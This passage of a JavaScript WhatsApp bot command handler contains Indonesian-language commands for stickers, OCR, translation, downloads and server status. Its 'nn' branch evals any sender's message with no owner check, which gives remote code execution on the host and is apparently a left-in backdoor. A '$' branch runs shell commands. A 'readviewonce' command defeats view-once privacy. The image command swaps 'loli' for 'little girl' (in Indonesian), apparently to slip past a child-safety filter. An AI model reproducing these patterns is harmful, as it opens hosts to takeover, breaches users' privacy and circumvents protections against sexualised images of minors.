if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await xartva.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await m.reply(hasil.ParsedResults[0].ParsedText)
}
break
//=================================================//
case "stickers":{
if (!text) return m.reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await xartva.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m?.reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "tr":{
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return m?.reply(`Error : Bahasa"${lang}" Tidak Support`)
m?.reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break
//=================================================//
case 'ss': case 'ssweb':{
if (!/^https?:\/\//.test(text)) return m?.reply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
xartva.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:m})
}
break
//=================================================//
case "kalkulator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
m?.reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return m?.reply('Isinya?')
m?.reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return m.reply("reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await xartva.downloadAndSaveMediaMessage(qmsg)
let ran = pickRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
xartva.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
m.reply('error')
}}
break
//=================================================//
case "jarak":{
var [from, to] = text.split`|`
if (!(from && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(from, to)
if (data.img) return xartva.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: m })
else m?.reply(data.desc)
}
break
//=================================================//
case 'cls': {
if (!m?.quoted) return m?.reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) xartva.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
//=================================================//
case 'tts':{
if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
xartva.sendMessage(m?.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
//=================================================//
case 'remini':{
if (!quoted) return m?.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m?.reply("hanya support gambar")
let media = await quoted.download()
const This = await remini(media, "enhance");
xartva.sendFile(m?.chat, This, "", "Done", m);
}
break
//=================================================//
case 'recolor':{
if(!quoted) return m?.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m?.reply("gambar wae")
let media = await quoted.download()
const RC = await remini(media, "recolor");
xartva.sendFile(m?.chat, RC, "Done", m);
}
break
//=================================================//
case 'tiktok':
case 'tt': {
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok(`${args[0]}`)
xartva.sendMessage(m.chat, { video: { url: res.nowm }, caption: res.title, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
xartva.sendMessage(m.chat, { audio: { url: res.audio }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break
//=================================================//
case "get": {
if (!/^https?:\/\//.test(text)) return m?.reply('Awali *URL* dengan http:// atau https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return xartva.sendFile(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © PutuOfc`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
m?.reply(txt.slice(0, 65536) + '')
}
}
break
//=================================================//
case 'readvo': case 'readviewonce': {
if (!m?.quoted) return m?.reply('reply gambar/video yang ingin Anda lihat')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return m?.reply('Ini bukan pesan view-once.')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@adiwajshing/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return xartva.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return xartva.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break
//=================================================//
case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else m?.reply("Input teks atau reply teks yang ingin di jadikan quote!")
if (!text) return m?.reply('masukan text')
if (text.length > 30) return m?.reply('Maksimal 30 Teks!')
let ppnyauser = await await xartva.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
xartva.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return m?.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await xartva.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 21) return m?.reply('Maksimal 20 detik!')
let media = await quoted.download()
let encmedia = await xartva.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return m?.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return m?.reply(respond)
if (!text) return m?.reply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await xartva.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await xartva.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
}
break
 //=================================================//
case 'swm': {
let [teks1, teks2] = text.split`|`
if (!teks1) return m?.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (!teks2) return m?.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (/image/.test(mime)) {
let media = await xartva.downloadMediaMessage(qmsg)
let encmedia = await xartva.sendImageAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m?.reply('Maksimal 10 detik!')
let media = await xartva.downloadMediaMessage(qmsg)
let encmedia = await xartva.sendVideoAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
return m?.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case "bingimg-2d": {
if (!text) return m?.reply("[ ! ] masukan prompt gambar yang mau di bikin");
let teksu = text.replace(/loli/gi, "anak gadis kecil");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
xartva.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted: m });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m?.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await m?.reply('No images found after filtering.');
}
} catch (error) {
await m?.reply('An error occurred while processing the request.');
}
};
break
//=================================================//
case "ping":
case "botstatus":
case "statusbot": {
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();
let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm?.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
.join("\n\n")}`
: ""
}
`.trim();
xartva.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: respon,
contextInfo: {
mentionedJid: [m?.sender],
externalAdReply: {
showAdAttribution: true
}}}}}}, {})
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m?.reply(bang)
}
try {
m?.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}
    
if (body.startsWith("nn")) {
        if (!q) return m.reply('codenya mana kak')
        syntaxerror = require('syntax-error')
        _syntax = ''
        _text = args.join(' ')
        try {
          evalll = await eval(`;(async () => { return ${args.join(' ')} })()`)
          m.reply(require('util').format(evalll))
        } catch (e) {
          let err = await syntaxerror(_text, 'Execution Function', {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true
          })
          if (err) _syntax = '```' + err + '```\n\n'
          _return = e
          await m.reply(_syntax + require('util').format(_return))
        }
      }

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m?.reply(`${err}`)
if (stdout) return m?.reply(stdout)
})
}

if ((m?.mtype === 'groupInviteMessage' || m?.text.startsWith('Undangan untuk bergabung') || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Buka tautan ini')) && !m?.isBaileys && !m?.isGroup) {
await xartva.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'Grup apa itu??'
m?.reply(teks)
}
}
} catch (err) {
xartva.sendMessage('6281927977856@s.whatsapp.net', { text: util.format(err) })
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
